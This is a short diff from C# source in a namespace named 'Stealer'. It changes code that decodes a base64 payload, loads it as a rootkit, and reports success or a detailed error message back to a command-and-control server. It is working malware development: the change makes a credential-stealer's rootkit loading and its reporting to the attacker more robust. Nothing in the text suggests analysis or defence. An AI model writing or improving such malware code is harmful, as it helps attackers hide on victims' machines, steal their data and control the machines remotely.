@@ -217,8 +217,15 @@ namespace Stealer
                     try
                     {
                         byte[] sysBytes = Convert.FromBase64String(b64sys);
-                        bool ok = RootkitClient.Load(sysBytes);
-                        C2Client.SendText("{\"type\":\"rootkit_status\",\"loaded\":" + (ok ? "true" : "false") + "}");
+                        bool ok = RootkitClient.Load(sysBytes, out string errStr);
+                        if (ok)
+                        {
+                            C2Client.SendText("{\"type\":\"rootkit_status\",\"loaded\":true}");
+                        }
+                        else
+                        {
+                            C2Client.SendText("{\"type\":\"rootkit_status\",\"loaded\":false,\"error\":\"" + EscJson(errStr ?? "Unknown load error") + "\"}");
+                        }
                     }
                     catch (Exception ex)
                     {
